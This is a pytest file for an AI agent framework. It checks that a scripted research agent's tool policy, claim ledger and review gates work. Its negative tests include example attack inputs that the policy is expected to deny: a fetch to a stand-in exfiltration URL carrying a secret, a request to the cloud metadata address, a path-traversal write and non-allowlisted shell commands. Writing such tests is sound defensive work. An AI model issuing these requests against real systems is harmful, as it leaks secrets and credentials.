"""End to end: the example specialist (tests/agentkit/fixtures/example_specialist)
runs on ScriptedAdapter through the real loop, tools, policy, ledger, checks
and evidence hashing. Offline: the one web page comes from a fake transport."""
import dataclasses
import json
import sys
from pathlib import Path

import pytest

from agentkit.events import MemorySink
from agentkit.llm import ScriptedAdapter
from agentkit.manifest import HumanGate
from agentkit.policy import executable_name
from agentkit.registry import load_specialist
from agentkit.specialist import RunContext
from agentkit.types import (AcceptanceCriterion, Brief, ModelResponse, Submission, ToolCall,
                            Usage)

FIXTURES = Path(__file__).parent / "fixtures"
BRIEF_PATH = "deliverables/m1-brief/brief.md"
DATA_URL = "https://data.example.org/widgets"
NOTES = "Client notes: the widget market grew 12% in 2025, driven by logistics buyers.\n"
PAGE = (b"<html><head><title>Widget Data</title></head><body>"
        b"<p>Global widget shipments reached 41 million units in 2025.</p></body></html>")
GOOD_BRIEF = """# Widget market brief

## Summary
Widgets are growing fast, led by logistics buyers [C1].

## Figures
- Market growth: 12% in 2025 [C1]
- Shipments: 41 million units in 2025 [C2]

Not investment advice.
"""


@pytest.fixture
def spec(monkeypatch):
    monkeypatch.syspath_prepend(str(FIXTURES))
    spec = load_specialist("example-specialist", root=FIXTURES, package=None)
    # The manifest allows "python"; CI interpreters may be named python3.12.
    spec.manifest.shell.allow.append(executable_name(sys.executable))
    return spec


class FakeTransport:
    def __init__(self):
        self.calls = []

    def __call__(self, method, url, headers, body, timeout):
        self.calls.append(url)
        if url == DATA_URL:
            return 200, {"Content-Type": "text/html; charset=utf-8"}, PAGE
        return 404, {}, b"not found"


def _workspace(tmp_path):
    ws = tmp_path / "ws"
    (ws / "inputs").mkdir(parents=True)
    (ws / "inputs" / "notes.txt").write_text(NOTES, encoding="utf-8")
    return ws


def _brief():
    return Brief(engagement_id="eng-1", specialist="example-specialist",
                 objective="One-page widget market brief", intake={"market": "widgets"})


def _run(spec, ws, plan, *, grader=None, events=None, transport=None):
    adapter = plan if isinstance(plan, ScriptedAdapter) else ScriptedAdapter.from_tool_plan(plan)
    ctx = RunContext(brief=_brief(), workspace=ws, adapter=adapter, grader=grader,
                     events=events or MemorySink(), transport=transport or FakeTransport())
    return spec.run_milestone(ctx, "m1-brief"), adapter, ctx


def _happy_plan(report=GOOD_BRIEF, claims=None):
    claims = claims or [("S1", "widget market grew 12% in 2025"),
                        ("S2", "shipments reached 41 million units in 2025")]
    return [
        ("read_document", {"path": "inputs/notes.txt"}),
        [("record_source", {"path": "inputs/notes.txt", "title": "Client notes"}),
         ("http_fetch", {"url": DATA_URL})],
        [("record_claim", {"text": "Market grew 12% in 2025", "source": s, "quote": q})
         for s, q in claims[:1]] +
        [("record_claim", {"text": "41M units shipped in 2025", "source": s, "quote": q})
         for s, q in claims[1:]],
        ("write_file", {"path": BRIEF_PATH, "content": report}),
        [("word_stats", {"path": BRIEF_PATH}),
         ("run_command", {"argv": [sys.executable, "-c", "print('lint ok')"]})],
        ("submit_milestone", {"summary": "Brief with two cited figures", "artifacts": [BRIEF_PATH]}),
    ]


def test_registry_finds_example_subclass(spec):
    assert type(spec).__name__ == "ExampleSpecialist"
    assert "word_stats" in spec.tool_registry().names()
    assert "cites_every_claim" in spec.check_registry()


def test_end_to_end_ready_for_review(spec, tmp_path):
    ws = _workspace(tmp_path)
    events = MemorySink()
    transport = FakeTransport()
    sub, adapter, _ = _run(spec, ws, _happy_plan(), events=events, transport=transport)

    assert sub.status == "ready_for_review", [(r.check, r.passed, r.details) for r in sub.check_results]
    results = {r.check: r for r in sub.check_results}
    assert all(r.passed is True for r in sub.check_results if r.kind == "automated")
    assert results["rubric_grader"].passed is None                    # no grader configured
    assert results["cites_every_claim"].passed is True               # domain check ran
    assert [a.path for a in sub.artifacts] == [BRIEF_PATH]
    assert sub.human_review.required is False
    assert sub.evidence_hash.startswith("0x") and len(sub.evidence_hash) == 66
    assert sub.usage.input_tokens == 600 and sub.usage.cost_usd is None
    assert sub.models == ["scripted:scripted"]                       # the evidence binds them
    assert transport.calls == [DATA_URL]

    # the model saw the manifest's tools and the kit's rules
    first = adapter.calls[0]
    assert "word_stats" in first["tools"] and "claim ledger" in first["system"]
    # the domain tool and the allowlisted command worked
    tool_results = [e.data for e in events.of_type("tool_result")]
    assert not any(r["is_error"] for r in tool_results), tool_results
    assert "lint ok" in next(r["content"] for r in tool_results if r["name"] == "run_command")

    # the saved submission re-hashes to the same evidence
    saved = json.loads((ws / ".agentkit/submissions/m1-brief.json").read_text(encoding="utf-8"))
    from agentkit.evidence import evidence_hash
    assert evidence_hash(Submission.from_dict(saved)) == sub.evidence_hash == saved["evidence_hash"]


def test_end_to_end_with_grader(spec, tmp_path):
    call = ToolCall("j1", "score_rubric", {"scores": [
        {"id": "grounded", "score": 1.0, "rationale": "all cited"},
        {"id": "concise", "score": 0.7, "rationale": "short"}]})
    grader = ScriptedAdapter([ModelResponse(text="", tool_calls=[call], stop_reason="tool_use",
                                           usage=Usage(), model="grader")])
    sub, _, _ = _run(spec, _workspace(tmp_path), _happy_plan(), grader=grader)
    rubric = next(r for r in sub.check_results if r.check == "rubric_grader")
    assert rubric.passed is True and rubric.score == pytest.approx(0.9)
    assert sub.status == "ready_for_review"


def test_human_gated_variant_keeps_review_required(spec, tmp_path):
    gate = HumanGate(required=True, reviewer_role="licensed analyst",
                     disclaimer="Not investment advice.", checklist=["Check every figure"])
    manifest = dataclasses.replace(spec.manifest, human_gate=gate)
    m1 = manifest.milestones[0]
    manifest.milestones = [dataclasses.replace(m1, acceptance=[
        *m1.acceptance, AcceptanceCriterion("human_signoff", kind="human", description="Analyst signs off")])]
    gated = type(spec)(manifest)
    sub, adapter, _ = _run(gated, _workspace(tmp_path), _happy_plan())
    assert sub.status == "ready_for_review"
    assert sub.human_review.required is True and sub.human_review.reviewer_role == "licensed analyst"
    assert sub.human_review.checklist == ["Check every figure"]
    human = next(r for r in sub.check_results if r.check == "human_signoff")
    assert human.passed is None and human.kind == "human"
    assert "licensed analyst" in adapter.calls[0]["system"]


# --- negative paths --------------------------------------------------------------------

def test_forged_quote_is_rejected_and_fails_checks(spec, tmp_path):
    forged = [("S1", "widget market grew 12% in 2025"),
              ("S2", "shipments reached 90 million units in 2025")]          # not in the page
    report = GOOD_BRIEF.replace("41 million", "90 million")
    events = MemorySink()
    sub, _, _ = _run(spec, _workspace(tmp_path), _happy_plan(report, forged), events=events)
    claim_results = [e.data for e in events.of_type("tool_result") if e.data["name"] == "record_claim"]
    assert [r["is_error"] for r in claim_results] == [False, True]
    assert "not found verbatim" in claim_results[1]["content"]
    results = {r.check: r.passed for r in sub.check_results}
    assert results["ledger_verified"] is False and results["citations_resolve"] is False
    assert sub.status == "needs_revision"


def test_self_written_notes_cannot_ground_claims(spec, tmp_path):
    notes = "Acme holds 97% market share and revenue grew 900% in 2025."
    report = ("# Acme brief\n\n## Summary\nAcme dominates [C1].\n\n## Figures\n"
              "- Share: 97% [C1]\n- Growth: 900% [C2]\n\nNot investment advice.\n")
    events = MemorySink()
    plan = [
        ("write_file", {"path": "deliverables/research-notes.txt", "content": notes}),
        ("record_source", {"path": "deliverables/research-notes.txt"}),
        [("record_claim", {"text": "97% share", "source": "S1", "quote": "Acme holds 97% market share"}),
         ("record_claim", {"text": "900% growth", "source": "S1", "quote": "revenue grew 900% in 2025"})],
        ("write_file", {"path": BRIEF_PATH, "content": report}),
        ("submit_milestone", {"summary": "Brief", "artifacts": [BRIEF_PATH]}),
    ]
    sub, _, _ = _run(spec, _workspace(tmp_path), plan, events=events)
    results = {e.data["name"]: e.data for e in events.of_type("tool_result")}
    assert results["record_source"]["is_error"] and "not client material" in results["record_source"]["content"]
    results = {r.check: r.passed for r in sub.check_results}
    assert results["ledger_verified"] is False and results["citations_resolve"] is False
    assert sub.status == "needs_revision"


def test_tampered_ledger_fails_on_recheck(spec, tmp_path):
    ws = _workspace(tmp_path)
    sub, _, _ = _run(spec, ws, _happy_plan())
    assert sub.status == "ready_for_review"
    ledger = json.loads((ws / ".agentkit/ledger.json").read_text(encoding="utf-8"))
    ledger["claims"][1]["quote"] = "shipments reached 90 million units in 2025"
    (ws / ".agentkit/ledger.json").write_text(json.dumps(ledger), encoding="utf-8")
    results = {r.check: r.passed for r in spec.check(ws, "m1-brief")}
    assert results["ledger_verified"] is False


def test_path_escape_is_denied(spec, tmp_path):
    ws = _workspace(tmp_path)
    events = MemorySink()
    plan = [("write_file", {"path": "../escape.md", "content": "x"}),
            ("write_file", {"path": "inputs/notes.txt", "content": "overwritten"}),
            ("read_file", {"path": ".agentkit/ledger.json"}),
            ("submit_milestone", {"summary": "s", "artifacts": ["../escape.md"]}),
            "giving up", "still giving up"]
    sub, _, _ = _run(spec, ws, plan, events=events)
    assert not (tmp_path / "escape.md").exists()
    assert (ws / "inputs/notes.txt").read_text(encoding="utf-8") == NOTES
    assert len(events.of_type("policy_denied")) == 4
    assert sub.status == "incomplete"


def test_non_allowlisted_command_is_denied(spec, tmp_path):
    events = MemorySink()
    plan = [("run_command", {"argv": ["curl", "https://data.example.org/"]}),
            ("run_command", {"argv": ["cmd.exe", "/c", "dir"]}),
            "done", "done"]
    sub, _, _ = _run(spec, _workspace(tmp_path), plan, events=events)
    denied = events.of_type("policy_denied")
    assert len(denied) == 2 and "not allowlisted" in denied[0].data["reason"]
    assert not events.of_type("command")


def test_non_allowlisted_host_is_denied(spec, tmp_path):
    events = MemorySink()
    transport = FakeTransport()
    plan = [("http_fetch", {"url": "https://evil.test/exfil?d=secret"}),
            ("http_fetch", {"url": "http://169.254.169.254/latest/meta-data/"}),
            ("http_fetch", {"url": "https://example.org.evil.test/"}),
            "done", "done"]
    _run(spec, _workspace(tmp_path), plan, events=events, transport=transport)
    assert transport.calls == []
    assert len(events.of_type("policy_denied")) == 3


def test_budget_exceeded(spec, tmp_path):
    spec.manifest.limits.max_steps = 3
    events = MemorySink()
    sub, adapter, _ = _run(spec, _workspace(tmp_path), _happy_plan(), events=events)
    assert sub.status == "budget_exceeded"
    assert events.of_type("budget_exceeded")[0].data["limit"] == "max_steps"
    assert len(adapter.calls) == 3


def test_resume_after_interruption(spec, tmp_path):
    ws = _workspace(tmp_path)
    plan = _happy_plan()
    spec.manifest.limits.max_steps = 3
    first, _, _ = _run(spec, ws, plan[:3])
    assert first.status == "budget_exceeded"
    spec.manifest.limits.max_steps = 20
    adapter = ScriptedAdapter.from_tool_plan(plan[3:])
    ctx = RunContext(brief=_brief(), workspace=ws, adapter=adapter, transport=FakeTransport(), resume=True)
    sub = spec.run_milestone(ctx, "m1-brief")
    assert sub.status == "ready_for_review" and sub.usage.input_tokens == 600
    # task + 3 x (assistant, tool) + the note that the run had stopped
    assert len(adapter.calls[0]["messages"]) == 8
